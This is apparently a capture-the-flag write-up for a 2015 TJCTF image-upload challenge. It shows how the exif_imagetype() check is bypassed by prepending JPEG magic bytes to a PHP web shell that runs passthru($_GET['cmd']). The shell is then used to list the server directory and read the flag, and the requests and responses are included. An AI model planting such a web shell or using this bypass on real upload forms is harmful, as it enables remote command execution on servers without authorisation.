### Solved by historypeats

This challenge allowed us to upload an image and view it. There are checks in place to ensure that the file is indeed an image. It is not based on the file extension. Instead, the check is performed using the exif_imagetype() php function. This function checks the magic headers of a file to determine the MIME type. This can be seen in the following code snippet:

```php
if(!in_array(exif_imagetype($_FILES["file"]["tmp_name"]),$allowed_types)){
    echo '<div class="alert alert-danger" role="alert">Image is not a PNG, JPEG, or GIF.</div>';
    $ok = 0;
}
```
This is easy enough to bypass. All we need to do is create a file with the beginning bytes being the magic headers of an image MIME type and then insert some php code for a webshell.

Creating the webshell with python:
```python
f = open('exploit.php', 'w')
f.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>') # This is the magic header for a JPEG image
f.close()
```
Now we have a file called exploit.php with the first bytes being the headers for a JPEG file, followed by some php code that will execute what we send in the cmd parameter. All that is left to do is upload the file, navigate to it and enter our commands.

Now that we have a webshell, I start searching for the key. I find it with the following request:
```
http://imageit.p.tjctf.org/uploads/IDqqgpwVJeOetYbFzvAmqA5Q8aD1gZ.php?cmd=ls+../
```
The results of ls for the directory above is as follows:
```
HTTP/1.1 200 OK
Server: nginx/1.6.2 (Ubuntu)
Date: Tue, 28 Apr 2015 19:57:31 GMT
Content-Type: text/html
Content-Length: 77
Connection: keep-alive
X-Powered-By: PHP/5.5.9-1ubuntu4.7
Vary: Accept-Encoding

ÿØÿàDockerfile
flag_obdf3wodfsid0f87sb9f4bs9n90
index.php
upload.php
uploads
```

All we need to do now is cat the file for the flag. I do this with the following request:
```
http://imageit.p.tjctf.org/uploads/IDqqgpwVJeOetYbFzvAmqA5Q8aD1gZ.php?cmd=cat+../flag_obdf3wodfsid0f87sb9f4bs9n90
```

And the response is:
```
HTTP/1.1 200 OK
Server: nginx/1.6.2 (Ubuntu)
Date: Tue, 28 Apr 2015 19:58:00 GMT
Content-Type: text/html
Content-Length: 19
Connection: keep-alive
X-Powered-By: PHP/5.5.9-1ubuntu4.7

ÿØÿàwhat_is_love??

```

Key: what_is_love??
